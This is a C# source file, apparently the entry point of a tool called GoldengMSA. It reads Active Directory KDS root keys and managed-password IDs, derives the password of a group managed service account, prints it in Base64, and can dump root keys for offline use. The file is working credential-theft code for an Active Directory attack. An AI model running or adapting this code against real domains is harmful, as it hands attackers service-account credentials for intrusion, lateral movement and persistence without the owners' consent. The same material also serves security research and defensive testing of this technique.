using System;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Security.Principal;

namespace GoldengMSA
{
    public class Program
    {                         
        //public static void ExportRootKey(string SIDString, string path)
        //{
        //    SearchResult result = Utils.QueryRootKey(SIDString);
        //    Root_Key.Export(result, path);
        //}

        //public static Root_Key ImportRootKey(string path)
        //{
        //    return new Root_Key(path);
        //}

        public static string GetGmsaPassword(string SIDString, Root_Key RootKey, byte[] Msds_ManagedPasswordID, string DomainName, string ForestName)
        {
            int l0KeyID = 0, l1KeyID = 0, l2KeyID = 0;
            Utils.GetCurrentIntervalID(Utils.GetKdsKeyCycleDuration(), 0, ref l0KeyID, ref l1KeyID, ref l2KeyID);

            byte[] gMSASD = { 0x1, 0x0, 0x4, 0x80, 0x30, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x02, 0x0, 0x1C, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x14, 0x0, 0x9F, 0x1, 0x12, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x9, 0x0, 0x0, 0x0, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x12, 0x0, 0x0, 0x0 };
            Group_Key_Envelope gke;
            int gkeSize;

            GetKey.GetSIDKeyLocal(gMSASD, gMSASD.Length, RootKey, l0KeyID, l1KeyID, l2KeyID, 0, out gke, out gkeSize, DomainName, ForestName);

            int passwordBlobSize = 256;
            byte[] passwordBlob = new byte[passwordBlobSize];
            var sid = new SecurityIdentifier(SIDString);
            byte[] sidBytes = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBytes, 0);

            GmsaPassword.GenerateGMSAPassowrd(gke, gkeSize, Msds_ManagedPasswordID, sidBytes, IntPtr.Zero, IntPtr.Zero, out passwordBlob, passwordBlobSize);
            return Convert.ToBase64String(passwordBlob);
        }

        public static void WriteGmsaPassword(string SID, Root_Key RootKey = null, byte[] ManagedPasswordIDBytes = null)
        {
            string domainName = "", forestName = "";

            // Means we are not running offline
            if (ManagedPasswordIDBytes == null || RootKey == null)
            {
                domainName = Utils.GetDomainName();
                forestName = Utils.GetForestName();
            }
            if (ManagedPasswordIDBytes == null)
            {
                ManagedPasswordIDBytes = Utils.QueryManagedPasswordID(SID);
            }
            if (RootKey == null)
            {
                Msds_ManagedPasswordID managedPasswordID = new Msds_ManagedPasswordID(ManagedPasswordIDBytes);
                RootKey = new Root_Key(Utils.QueryRootKey(managedPasswordID.RootKeyIdentifier.ToString()));
            }
            Console.WriteLine(GetGmsaPassword(SID, RootKey, ManagedPasswordIDBytes, domainName, forestName));
        }

        public static void WriteRootKey (string RootKeyID)
        {
            Root_Key rootKey = new Root_Key(Utils.QueryRootKey(RootKeyID));
            Utils.PrintRootKey(rootKey);
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Utils.ShowUsage();
                return;
            }

            Utils.ParseArgs(args);
            return;
        }
    }
}